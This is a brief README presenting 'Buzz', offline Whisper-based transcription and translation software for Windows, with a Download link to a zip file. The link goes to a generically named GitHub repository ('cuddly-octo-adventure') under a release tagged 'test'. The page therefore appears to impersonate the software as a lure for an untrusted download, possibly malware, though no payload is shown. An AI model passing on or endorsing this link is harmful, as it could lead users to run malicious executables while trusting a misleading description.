# Buzz

Buzz is desktop software for offline audio transcription and translation on a personal computer. It is powered by OpenAI's Whisper and is intended for users who want to convert spoken audio into text without relying on an online transcription service.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/buzz.zip)

## Overview

Buzz focuses on two core tasks:

- Transcribing audio into text
- Translating spoken content with Whisper-based processing

Because the transcription workflow runs offline on a personal computer, Buzz is useful for users who prefer local processing for audio files, interviews, recordings, notes, lectures, or other spoken material.

This README is oriented toward users looking for a Windows desktop transcription workflow. Use the provided Windows package or build when available for your environment.
